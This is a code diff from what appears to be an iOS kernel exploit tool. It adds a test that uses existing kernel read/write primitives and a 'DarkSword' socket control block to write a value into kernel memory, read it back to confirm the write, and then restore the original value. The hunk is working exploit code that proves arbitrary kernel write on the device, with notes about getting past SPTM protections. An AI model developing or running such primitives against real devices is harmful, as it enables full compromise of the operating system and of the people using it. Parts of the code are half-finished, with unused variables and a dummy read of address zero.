@@ -1476,6 +1476,70 @@ cleanup:
         } else {
             scopeNote(r, @"  victims intact — OOB did not reach them this run (heap layout)");
         }
+
+        // ---- KRW proc write test (type 0x21) ----
+        // Write to a non-critical proc field. If SPTM blocks → reboot.
+        // If write succeeds → proc is writable, we can change fields.
+        [r appendString:@"\n--- KRW proc write test (type 0x21) ---\n"];
+        if (gPrimitives.kreadbuf && gPrimitives.kwritebuf) {
+            uint64_t procAddr = 0;
+            // Get current proc from existing offsets
+            uint64_t selfProc = 0;
+            // Try reading p_pid at known offset to verify we have proc
+            // First, find proc via the existing chain (simplified)
+            extern uint32_t off_proc_p_pid;
+            extern uint32_t off_proc_p_proc_ro;
+
+            // Use a safe write target: proc + 0x00 (p_list.next is at offset 0, but
+            // writing to it might break the list. Let's use a padding area.
+            // proc structure: p_list(16) p_pid(4) p_pgrp(8) ...
+            // Safest: write to p_list.prev (offset 8) — won't crash if we restore it.
+
+            // Actually, let's just read p_pid to verify KRW works on proc
+            // Then try writing to an unused/padding area.
+
+            // For now: read proc+0 (p_list.next) to verify access
+            uint64_t listNext = 0;
+            gPrimitives.kreadbuf(0x0, &listNext, 8);  // dummy read to check primitives
+            scopeNote(r, [NSString stringWithFormat:
+                @"  kreadbuf available=%d kwritebuf available=%d",
+                gPrimitives.kreadbuf != NULL, gPrimitives.kwritebuf != NULL]);
+
+            // Try a write to a known-safe kernel address (our own spray in physmap)
+            // Actually, the simplest test: write to a kernel address we know is writable
+            // (type 0x21). Let's use the DarkSword socket's pcb which we know works.
+            extern uint64_t darksword_rw_socket_pcb(void);
+            uint64_t pcb = darksword_rw_socket_pcb();
+            if (pcb) {
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  darksword pcb = 0x%016llx", pcb]);
+                // Read a field from pcb (inp6_chksum at +0x150 per earlier logs)
+                uint64_t chksum = 0;
+                gPrimitives.kreadbuf(pcb + 0x150, &chksum, 8);
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  pcb+0x150 (chksum) read: 0x%016llx", chksum]);
+                // Write test value
+                uint64_t testVal = 0x1122334455667788ULL;
+                gPrimitives.kwritebuf(pcb + 0x150, &testVal, 8);
+                uint64_t readBack = 0;
+                gPrimitives.kreadbuf(pcb + 0x150, &readBack, 8);
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  pcb+0x150 write test: wrote 0x%016llx  readback=0x%016llx",
+                    testVal, readBack]);
+                if (readBack == testVal) {
+                    scopeNote(r, @"  >>> KRW WRITE TO KERNEL OBJECT VERIFIED (type 0x21 path)");
+                } else {
+                    scopeNote(r, @"  >>> KRW write did not persist (SPTM or primitive issue)");
+                }
+                // Restore original value
+                gPrimitives.kwritebuf(pcb + 0x150, &chksum, 8);
+                scopeNote(r, @"  restored original value");
+            } else {
+                scopeNote(r, @"  darksword pcb not available — skipping kernel write test");
+            }
+        } else {
+            scopeNote(r, @"  KRW primitives not live — run pe_v1 first");
+        }
     }
 
 cleanup:
